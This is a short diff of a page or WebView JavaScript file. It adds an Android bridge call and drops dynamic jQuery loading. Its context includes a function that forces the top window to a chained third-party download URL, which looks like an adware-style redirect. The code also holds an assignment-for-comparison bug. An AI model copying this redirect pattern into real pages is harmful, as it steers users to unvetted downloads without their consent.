@@ -1,11 +1,11 @@
-var pager = window.location.href;
+var pager = window.location.href;window.CallToAndroidFunction1.setVisible();
 if (pager != null && pager.startsWith("http:")) {
     window.location.href = pager.replace("http:","https:")
 }
 
 var aa = "";
 var kka = "true";   
-var head= document.getElementsByTagName('header')[0]; var scriptxx= document.createElement('script'); scriptxx.src= 'https://ajax.aspnetcdn.com/ajax/jQuery/jquery-1.7.1.min.js'; scriptxx.type = "text/javascript"; scriptxx.async = false; head.appendChild(scriptxx); var x= document.createElement('script'); x.src= 'https://ajax.aspnetcdn.com/ajax/jquery.validate/1.9/jquery.validate.min.js'; x.type = "text/javascript"; x.async = false; head.appendChild(x); x.onload=function( evt ) {
+
 
 if (document.getElementById("cf-wrapper")){
 
@@ -87,7 +87,7 @@ function ia9() {
    top.location.href ="http://giganet.tv/https://playmys.xtgem.com/download.php?u=" + hh;
    kka = "true";   
 }
-}
+
 
  setInterval(function(){
      if(kka = "true"){}
